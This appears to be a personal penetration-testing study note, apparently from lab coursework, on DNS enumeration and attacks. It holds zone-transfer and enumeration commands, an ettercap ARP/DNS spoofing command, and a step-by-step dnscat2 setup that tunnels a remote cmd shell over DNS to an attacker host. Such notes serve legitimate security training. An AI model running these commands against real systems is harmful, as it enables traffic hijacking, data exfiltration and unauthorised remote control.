# Basic Info

- **Root Servers:** Manage highest level of DNS hierarchy and oversee top level domains globally, stepping in if lower level servers fail to respond 
- **Authoritative Name Servers:** hold final authority for queries within designated zones, providing definitive responses. If they cannot respond, queries escalated to root servers

# Enumeration 


```
dig version.bind CHAOS TCT @DNS 

nmap --script dns-nsid $NDS_IP 

dnsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 10.10.10.15

fierce --domain <DOMAIN> --dns <DNS_IP>

dnsrecon -t std -d hackviser.com -D /usr/share/dnsrecon/namelist.txt

maltego

dig @$ip -x $ip

dig @$ip  axfr trick.thb 
```

# Exploitation 
## DNS Spoofing 
- Introducing corrupt DNS data into cache, causing it to return incorrect IP address, diverting traffic to attacker's computer 

```
ettercap -T -q -M arp:remote /<gateway-ip>// /<target-ip>// -P dns_spoof
```
>[!IMPORTANT]
> how is gateway ip address found? Is it usually provided?
>
## DNS Exfiltration 
1. Clone and setup server
```
git clone https://github.com/iagox86/dnscat2.git
```
2. Start server
	1. Server: our machine
```
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
3. Transfer to attack host 
```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
wget https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/refs/heads/master/dnscat2.ps1 
sudo python3 -m http.server --bind 0.0.0.0
```

4. Establish tunnel on target system 
```powershell prompt:C:\Users\htb-student>
Import-Module .\dnscat2.ps1
Start-DNScat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

# Post Exploitation 
